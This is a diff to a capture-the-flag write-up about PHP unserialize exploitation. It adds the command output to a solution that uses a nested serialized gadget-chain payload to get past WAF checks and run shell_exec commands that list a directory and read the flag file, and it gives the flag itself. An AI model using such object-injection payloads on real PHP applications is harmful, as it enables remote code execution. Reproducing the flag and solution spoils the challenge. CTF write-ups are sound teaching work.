@@ -115,12 +115,26 @@ O:17:"GadgetTwo\Echoers":1:{s:5:"klass";O:16:"GadgetOne\Adders":1:{s:1:"x";O:16:
 
 By dumping the return of the shell command we will receive all of the files listed in the current directory including the name of the flag file. Now all we have to do is change the shell command to print out the contents of the flag.
 
+Output of shell command to list out directory
+```
+string(90) "182939124819238912571292389218129123.txt
+composer.json
+composer.lock
+index.php
+src
+vendor
+"
+```
+
 Full Nested Serialized Objects to print out flag file
 ```
 O:17:"GadgetTwo\Echoers":1:{s:5:"klass";O:16:"GadgetOne\Adders":1:{s:1:"x";O:16:"GadgetThree\Vuln":4:{s:4:"waf1";i:1;s:4:"waf2";s:4:"Þ­¾ï";s:4:"waf3";b:0;s:3:"cmd";s:69:"var_dump(shell_exec('cat 182939124819238912571292389218129123.txt'));";}}}
 ```
 
-By executing this command you will get the result - string(44) "TCP1P{unserialize in php go brrrrrrrr ouch}
+Output of shell command to read flag
+```
+string(44) "TCP1P{unserialize in php go brrrrrrrr ouch}
+```
 "
 
 ## Flag: TCP1P{unserialize in php go brrrrrrrr ouch}
